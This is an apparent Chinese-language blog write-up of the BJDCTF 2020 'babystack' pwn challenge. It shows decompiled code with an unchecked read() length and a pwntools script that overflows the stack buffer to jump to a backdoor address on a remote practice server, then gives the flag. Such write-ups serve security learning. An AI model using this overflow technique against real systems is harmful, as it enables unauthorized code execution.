---
title: bjdctf_2020_babystack
date: 2023-10-24
categories:
  - CTF
  - Pwn
---

## 前置工作

下载附件，用 IDA 64 打开，看到如下伪代码

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char buf[12]; // [rsp+0h] [rbp-10h] BYREF
  size_t nbytes; // [rsp+Ch] [rbp-4h] BYREF

  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 1, 0LL);
  LODWORD(nbytes) = 0;
  puts("**********************************");
  puts("*     Welcome to the BJDCTF!     *");
  puts("* And Welcome to the bin world!  *");
  puts("*  Let's try to pwn the world!   *");
  puts("* Please told me u answer loudly!*");
  puts("[+]Are u ready?");
  puts("[+]Please input the length of your name:");
  __isoc99_scanf("%d", &nbytes);
  puts("[+]What's u name?");
  read(0, buf, (unsigned int)nbytes);
  return 0;
}
```

发现危险函数 `read(0, buf, (unsigned int)nbytes)`，老脚本稍微改改就能用

## 编写 Exp

```python
from pwn import *

r = remote("node4.buuoj.cn", 29597)
backdoor_addr = 0x4006E6
r.sendline(b"9"*abs(0xC-0X4))
payload = b"A" * (0x10-0x0) + b"B" * 0x8 + pack(backdoor_addr, 64)
r.sendline(payload)
r.interactive()
```

最后得出 Flag 为 `flag{871bf3da-37db-4026-a43b-4dff76f2a8fd}`